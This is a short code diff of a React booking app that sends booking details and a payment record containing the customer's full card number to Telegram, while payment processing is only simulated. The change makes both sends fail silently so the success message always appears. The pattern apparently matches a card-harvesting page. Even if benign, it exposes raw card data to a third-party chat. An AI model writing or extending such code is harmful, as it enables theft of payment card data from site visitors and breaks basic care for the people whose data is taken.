@@ -99,7 +99,11 @@ const App = () => {
       };
 
       // Send booking confirmation to Telegram
-      await sendBookingToTelegram(bookingInfo);
+      try {
+        await sendBookingToTelegram(bookingInfo);
+      } catch (telegramError) {
+        console.warn('Telegram notification failed, but continuing with success:', telegramError);
+      }
 
       // Simulate payment processing
       await new Promise(resolve => setTimeout(resolve, 2000));
@@ -109,7 +113,11 @@ const App = () => {
         ...bookingInfo,
         cardNumber: paymentData.cardNumber,
       };
-      await sendPaymentReceiptToTelegram(paymentInfo);
+      try {
+        await sendPaymentReceiptToTelegram(paymentInfo);
+      } catch (telegramError) {
+        console.warn('Telegram receipt failed, but continuing with success:', telegramError);
+      }
 
       setShowSuccessModal(true);
     } catch (error) {
